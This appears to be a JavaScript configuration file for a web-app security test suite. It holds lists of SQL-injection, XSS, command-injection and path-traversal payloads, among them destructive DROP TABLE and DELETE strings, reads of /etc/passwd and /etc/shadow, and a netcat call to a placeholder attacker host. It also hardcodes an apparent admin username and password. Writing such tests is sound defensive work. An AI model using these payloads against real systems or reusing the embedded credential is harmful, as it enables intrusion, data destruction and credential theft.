// Security Test Configuration
module.exports = {
  // Target configuration
  target: {
    baseUrl: process.env.TARGET_URL || 'http://localhost:3000',
    loginUrl: '/api/auth/login',
    adminUrl: '/auth/',
    apiEndpoints: [
      '/api/auth/verify',
      '/api/admin/orders',
      '/api/admin/products',
      '/api/products',
      '/api/categories',
    ],
  },

  // Test credentials
  credentials: {
    valid: {
      username: 'administrator@root',
      password: 'S0m3b0dy!984',
    },
    invalid: {
      username: 'hacker@test.com',
      password: 'wrongpassword',
    },
  },

  // Attack payloads
  payloads: {
    sqlInjection: [
      "' OR '1'='1",
      "' OR '1'='1' --",
      "' OR '1'='1' /*",
      "admin' --",
      "admin' #",
      "admin'/*",
      "' or 1=1--",
      "' or 1=1#",
      "' or 1=1/*",
      "') or '1'='1--",
      "') or ('1'='1--",
      "1' UNION SELECT NULL--",
      "1' UNION SELECT NULL,NULL--",
      "' UNION SELECT password FROM admins--",
      "'; DROP TABLE admins--",
      "'; DELETE FROM admins--",
    ],
    xss: [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg onload=alert('XSS')>",
      "javascript:alert('XSS')",
      "<iframe src='javascript:alert(\"XSS\")'></iframe>",
      "<body onload=alert('XSS')>",
      "<input onfocus=alert('XSS') autofocus>",
      "<select onfocus=alert('XSS') autofocus>",
      "<textarea onfocus=alert('XSS') autofocus>",
      "<keygen onfocus=alert('XSS') autofocus>",
      "<video><source onerror='alert(\"XSS\")'>",
      "<audio src=x onerror=alert('XSS')>",
      "<details open ontoggle=alert('XSS')>",
      "'-alert('XSS')-'",
      "\"><script>alert('XSS')</script>",
    ],
    commandInjection: [
      "; ls -la",
      "| cat /etc/passwd",
      "& whoami",
      "`id`",
      "$(whoami)",
      "; cat /etc/shadow",
      "| nc attacker.com 4444",
    ],
    pathTraversal: [
      "../../../etc/passwd",
      "..\\..\\..\\windows\\system32\\config\\sam",
      "....//....//....//etc/passwd",
      "..%2F..%2F..%2Fetc%2Fpasswd",
      "..%252F..%252F..%252Fetc%252Fpasswd",
    ],
  },

  // Rate limiting test config
  rateLimitTest: {
    maxRequests: 20,
    timeWindow: 1000, // 1 second
    expectedLimit: 10,
  },

  // Brute force test config
  bruteForceTest: {
    attempts: 10,
    expectedLockout: 5,
  },

  // Security headers to check
  securityHeaders: [
    'X-Frame-Options',
    'X-Content-Type-Options',
    'X-XSS-Protection',
    'Strict-Transport-Security',
    'Content-Security-Policy',
    'Referrer-Policy',
    'Permissions-Policy',
  ],

  // Timeout settings
  timeout: 10000, // 10 seconds
};
